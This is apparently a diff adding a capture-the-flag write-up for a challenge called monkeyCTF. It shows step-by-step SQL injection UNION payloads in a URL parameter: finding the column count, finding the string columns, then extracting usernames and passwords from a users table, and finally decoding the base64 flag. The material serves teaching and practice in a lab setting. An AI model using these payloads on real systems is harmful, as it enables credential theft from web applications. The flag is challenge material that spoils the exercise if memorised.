@@ -1,0 +1,33 @@
+UNION attack in the URL
+
+First step is to determine the number of columns in the users table by performing multiple union select injections
+
+(
+/banana?id=0' UNION SELECT NULL, NULL FROM users--
+/banana?id=0' UNION SELECT NULL,NULL,NULL FROM users--
+.
+.
+.
+/banana?id=0' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL FROM users--
+)
+
+You will find that there are 6 coloumns in the user table
+
+The next step is to determine the datatype of each column. You are looking for two columns that store string data types.
+Do this by replacing a NULL with a random string for each null position
+
+(
+/banana?id=0' UNION SELECT NULL,'a',NULL,NULL,NULL,NULL FROM users--
+.
+.
+.
+/banana?id=0' UNION SELECT NULL,NULL,'a',NULL,NULL,NULL FROM users--
+)
+
+Coloumn 2 and 3 will be string datatypes. Now, you can query for the username and password using the following query:
+
+/banana?id=0' UNION SELECT NULL,USERNAME,PASSWORD,NULL,NULL,NULL FROM users--
+
+Scrolling down, there will be a card with the text "Flag". Decode (base64) the value bW9ua2V5Q1RGezVRTF91bmkwbl9hdHRhY2tfdDNjaH0=
+
+FLAG: monkeyCTF{5QL_uni0n_attack_t3ch}
